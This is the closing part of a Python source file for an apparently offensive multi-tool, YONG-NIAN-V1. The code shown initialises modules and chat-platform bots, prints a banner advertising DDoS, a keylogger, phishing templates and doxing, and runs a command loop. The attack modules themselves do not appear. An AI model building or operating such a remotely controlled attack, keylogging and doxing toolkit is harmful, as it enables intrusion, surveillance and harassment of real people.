        self.llm = CybersecurityLLM(self.db, self.config)
        
        # Initialize command handler
        self.handler = CommandHandler(
            self.db, self.config, self.ssh, self.dos, self.keylogger,
            self.attack_path, self.binary, self.apk, self.llm
        )
        
        # Initialize bots
        self.bots = {}
        self._initialize_bots()
        
        # Initialize web dashboard
        self.web = WebDashboard(self.handler, self.db, self.config)
        
        self.session_id = str(uuid.uuid4())[:8]
        self.running = True
    
    def _initialize_bots(self):
        """Initialize all bots"""
        # Discord
        if DISCORD_AVAILABLE and self.config.get('discord.token'):
            self.bots['discord'] = DiscordBot(self.handler, self.db, self.config)
        
        # Telegram
        if TELETHON_AVAILABLE and self.config.get('telegram.bot_token'):
            self.bots['telegram'] = TelegramBot(self.handler, self.db, self.config)
        
        # Slack
        if SLACK_AVAILABLE and self.config.get('slack.bot_token'):
            self.bots['slack'] = SlackBot(self.handler, self.db, self.config)
        
        # WhatsApp
        if SELENIUM_AVAILABLE and WEBDRIVER_MANAGER_AVAILABLE:
            self.bots['whatsapp'] = WhatsAppBot(self.handler, self.db, self.config)
        
        # Signal
        if SIGNAL_AVAILABLE and self.config.get('signal.phone_number'):
            self.bots['signal'] = SignalBot(self.handler, self.db, self.config)
        
        # iMessage
        if IMESSAGE_AVAILABLE and self.config.get('imessage.phone_numbers'):
            self.bots['imessage'] = iMessageBot(self.handler, self.db, self.config)
        
        # Google Chat
        if self.config.get('google_chat.webhook_url'):
            self.bots['google_chat'] = GoogleChatBot(self.handler, self.db, self.config)
    
    def print_banner(self):
        """Print ASCII banner"""
        banner = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════════════════════╗
║{Colors.SECONDARY}        🔷 YONG-NIAN-V1 v{VERSION} - CYBER COMMAND PLATFORM                           {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════════════════════╣
║{Colors.ACCENT}                                                                                              {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🔷 1000+ Security Commands           • 📡 All Ping Commands (30+)                     {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🗺️ All Traceroute Commands (35+)     • 🔍 All Nmap Commands (80+)                     {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🌐 All Curl Commands (80+)           • ⬇️ All Wget Commands (70+)                     {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🔌 All Netcat Commands (25+)         • 🔒 All SSH Commands (15+)                      {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 💥 DOS/DDOS Capabilities             • 🎣 100+ Phishing Templates                     {Colors.PRIMARY}║
║{Colors.SUCCESS}  • ⌨️ Elite Keylogger                   • 🔬 Binary Analysis & Disassembly              {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 📱 APK Analysis & Decompilation      • 🛤️ Dijkstra Attack Path Mapping              {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🤖 Cybersecurity LLM                 • 🔷 DOX Commands                              {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 📱 Multi-Platform Bots               • 💻 Beautiful Web Dashboard                   {Colors.PRIMARY}║
║{Colors.SUCCESS}  • Discord | Telegram | Slack          • Signal | WhatsApp | iMessage | Google Chat   {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════════════════════╣
║{Colors.ACCENT}                    🎯 FOR AUTHORIZED SECURITY TESTING ONLY                                    {Colors.PRIMARY}║
╚══════════════════════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.SUCCESS}🔷 Welcome to YONG-NIAN-V1 - Your Ultimate Penetration Testing Assistant{Colors.RESET}
{Colors.ACCENT}💡 Type 'help' to see all commands{Colors.RESET}
{Colors.ACCENT}🌐 Web dashboard available at http://localhost:5000{Colors.RESET}
{Colors.ACCENT}⌨️ Press F10 to start/stop keylogger{Colors.RESET}
{Colors.ACCENT}🎣 100+ Phishing Templates Available{Colors.RESET}
{Colors.ACCENT}🔬 Binary Analysis Ready{Colors.RESET}
{Colors.ACCENT}📱 APK Analysis Ready{Colors.RESET}
{Colors.ACCENT}🛤️ Dijkstra Attack Path Engine Ready{Colors.RESET}
{Colors.ACCENT}🤖 Cybersecurity LLM Ready{Colors.RESET}
{Colors.ACCENT}📱 Multi-Platform Bot Integration Ready{Colors.RESET}
        """
        print(banner)
    
    def check_dependencies(self):
        """Check all dependencies"""
        print(f"\n{Colors.PRIMARY}🔍 Checking dependencies...{Colors.RESET}")
        
        tools = ['ping', 'nmap', 'curl', 'wget', 'nc', 'dig', 'traceroute', 'ssh', 'whois', 'docker']
        for tool in tools:
            if shutil.which(tool):
                print(f"{Colors.SUCCESS}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ {tool} not found{Colors.RESET}")
        
        print(f"{Colors.SUCCESS}✅ paramiko{Colors.RESET}" if PARAMIKO_AVAILABLE else f"{Colors.WARNING}⚠️ paramiko - SSH disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS}✅ scapy{Colors.RESET}" if SCAPY_AVAILABLE else f"{Colors.WARNING}⚠️ scapy - advanced traffic disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS}✅ discord.py{Colors.RESET}" if DISCORD_AVAILABLE else f"{Colors.WARNING}⚠️ discord.py - Discord disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS}✅ telethon{Colors.RESET}" if TELETHON_AVAILABLE else f"{Colors.WARNING}⚠️ telethon - Telegram disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS}✅ slack-sdk{Colors.RESET}" if SLACK_AVAILABLE else f"{Colors.WARNING}⚠️ slack-sdk - Slack disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS}✅ flask{Colors.RESET}" if WEB_AVAILABLE else f"{Colors.WARNING}⚠️ flask - Web dashboard disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS}✅ pynput{Colors.RESET}" if KEYLOGGER_AVAILABLE else f"{Colors.WARNING}⚠️ pynput - Keylogger disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS}✅ pillow{Colors.RESET}" if PIL_AVAILABLE else f"{Colors.WARNING}⚠️ pillow - Steganography disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS}✅ cryptography{Colors.RESET}" if CRYPTO_AVAILABLE else f"{Colors.WARNING}⚠️ cryptography - Encryption disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS}✅ pefile{Colors.RESET}" if PEFILE_AVAILABLE else f"{Colors.WARNING}⚠️ pefile - PE analysis disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS}✅ capstone{Colors.RESET}" if CAPSTONE_AVAILABLE else f"{Colors.WARNING}⚠️ capstone - Disassembly disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS}✅ selenium{Colors.RESET}" if SELENIUM_AVAILABLE else f"{Colors.WARNING}⚠️ selenium - WhatsApp disabled{Colors.RESET}")
    
    def setup_platforms(self):
        """Configure platform integrations"""
        print(f"\n{Colors.PRIMARY}🤖 Platform Bot Configuration{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        # Discord
        setup = input(f"{Colors.ACCENT}Configure Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Enter Discord bot token: {Colors.RESET}").strip()
            prefix = input(f"{Colors.ACCENT}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.config.set('discord.token', token)
                self.config.set('discord.prefix', prefix)
                self.config.set('discord.enabled', True)
                print(f"{Colors.SUCCESS}✅ Discord configured{Colors.RESET}")
        
        # Telegram
        setup = input(f"{Colors.ACCENT}Configure Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Enter Telegram bot token: {Colors.RESET}").strip()
            chat_id = input(f"{Colors.ACCENT}Enter chat ID: {Colors.RESET}").strip()
            if token:
                self.config.set('telegram.bot_token', token)
                self.config.set('telegram.chat_id', chat_id)
                self.config.set('telegram.enabled', True)
                print(f"{Colors.SUCCESS}✅ Telegram configured{Colors.RESET}")
        
        # Slack
        setup = input(f"{Colors.ACCENT}Configure Slack bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Enter Slack bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.ACCENT}Enter channel ID: {Colors.RESET}").strip()
            if token:
                self.config.set('slack.bot_token', token)
                self.config.set('slack.channel_id', channel)
                self.config.set('slack.enabled', True)
                print(f"{Colors.SUCCESS}✅ Slack configured{Colors.RESET}")
        
        # WhatsApp
        setup = input(f"{Colors.ACCENT}Configure WhatsApp? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.ACCENT}Enter phone number: {Colors.RESET}").strip()
            if phone:
                self.config.set('whatsapp.phone_number', phone)
                self.config.set('whatsapp.enabled', True)
                print(f"{Colors.SUCCESS}✅ WhatsApp configured{Colors.RESET}")
        
        # Google Chat
        setup = input(f"{Colors.ACCENT}Configure Google Chat? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            webhook = input(f"{Colors.ACCENT}Enter Google Chat webhook URL: {Colors.RESET}").strip()
            if webhook:
                self.config.set('google_chat.webhook_url', webhook)
                self.config.set('google_chat.enabled', True)
                print(f"{Colors.SUCCESS}✅ Google Chat configured{Colors.RESET}")
        
        # Signal
        setup = input(f"{Colors.ACCENT}Configure Signal? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.ACCENT}Enter phone number: {Colors.RESET}").strip()
            if phone:
                self.config.set('signal.phone_number', phone)
                self.config.set('signal.enabled', True)
                print(f"{Colors.SUCCESS}✅ Signal configured{Colors.RESET}")
        
        # iMessage
        setup = input(f"{Colors.ACCENT}Configure iMessage? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phones = input(f"{Colors.ACCENT}Enter phone numbers (comma-separated): {Colors.RESET}").strip()
            if phones:
                self.config.set('imessage.phone_numbers', [p.strip() for p in phones.split(',')])
                self.config.set('imessage.enabled', True)
                print(f"{Colors.SUCCESS}✅ iMessage configured{Colors.RESET}")
        
        # LLM
        setup = input(f"{Colors.ACCENT}Configure LLM API? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            api_key = input(f"{Colors.ACCENT}Enter LLM API key: {Colors.RESET}").strip()
            api_url = input(f"{Colors.ACCENT}Enter LLM API URL: {Colors.RESET}").strip()
            if api_key and api_url:
                self.config.set('llm.api_key', api_key)
                self.config.set('llm.api_url', api_url)
                self.config.set('llm.enabled', True)
                print(f"{Colors.SUCCESS}✅ LLM configured{Colors.RESET}")
    
    def start_bots(self):
        """Start all configured bots"""
        if not self.bots:
            return
        
        print(f"\n{Colors.PRIMARY}🤖 Starting bots...{Colors.RESET}")
        
        for name, bot in self.bots.items():
            try:
                if bot.setup():
                    bot.start()
                    print(f"{Colors.SUCCESS}✅ {name} bot starting...{Colors.RESET}")
                else:
                    print(f"{Colors.WARNING}⚠️ {name} bot setup failed{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.ERROR}❌ {name} bot error: {e}{Colors.RESET}")
    
    def stop_bots(self):
        """Stop all bots"""
        for name, bot in self.bots.items():
            try:
                bot.stop()
                print(f"{Colors.SUCCESS}✅ {name} bot stopped{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.ERROR}❌ {name} bot error: {e}{Colors.RESET}")
    
    def run(self):
        """Run the application"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        self.check_dependencies()
        
        # Configure platforms if needed
        if not self.bots:
            setup = input(f"\n{Colors.ACCENT}Configure platform integrations? (y/n): {Colors.RESET}").strip().lower()
            if setup == 'y':
                self.setup_platforms()
                self._initialize_bots()
        
        # Start bots
        self.start_bots()
        
        # Start web dashboard
        if WEB_AVAILABLE:
            self.web.start()
        
        print(f"\n{Colors.SUCCESS}✅ YONG-NIAN-V1 ready! Session: {self.session_id}{Colors.RESET}")
        print(f"{Colors.ACCENT}   Type 'help' for commands{Colors.RESET}")
        print(f"{Colors.ACCENT}   ⌨️ Press F10 to start/stop the keylogger{Colors.RESET}")
        print(f"{Colors.ACCENT}   🎣 100+ Phishing Templates Available{Colors.RESET}")
        print(f"{Colors.ACCENT}   🔬 Binary Analysis Ready{Colors.RESET}")
        print(f"{Colors.ACCENT}   📱 APK Analysis Ready{Colors.RESET}")
        print(f"{Colors.ACCENT}   🛤️ Dijkstra Attack Path Engine Ready{Colors.RESET}")
        print(f"{Colors.ACCENT}   🤖 Cybersecurity LLM Ready{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.PRIMARY}[{Colors.SECONDARY}{self.session_id}{Colors.PRIMARY}]{Colors.ACCENT} 🤖> {Colors.RESET}"
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if command.lower() in ['exit', 'quit']:
                    self.running = False
                    print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
                    break
                
                result = self.handler.execute(command)
                
                if result['success']:
                    output = result.get('output', '')
                    if output:
                        print(output)
                    print(f"\n{Colors.SUCCESS}✅ Done ({result['execution_time']:.2f}s){Colors.RESET}")
                else:
                    print(f"\n{Colors.ERROR}❌ {result.get('output', 'Unknown error')}{Colors.RESET}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        self.stop_bots()
        if self.keylogger and self.keylogger.running:
            self.keylogger.stop()
        self.db.close()
        print(f"\n{Colors.SUCCESS}✅ Shutdown complete.{Colors.RESET}")

# ============================================================
# MAIN ENTRY POINT
# ============================================================
def main():
    """Main entry point"""
    try:
        print(f"{Colors.PRIMARY} 🤖 Starting YONG-NIAN-V1...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        # Check for admin privileges
        needs_admin = False
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            needs_admin = True
        
        if needs_admin:
            print(f"{Colors.WARNING}⚠️ Run with sudo/admin for full functionality{Colors.RESET}")
        
        app = YongNianV1()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

# ============================================================
# ENTRY POINT
# ============================================================
if __name__ == "__main__":
    main()
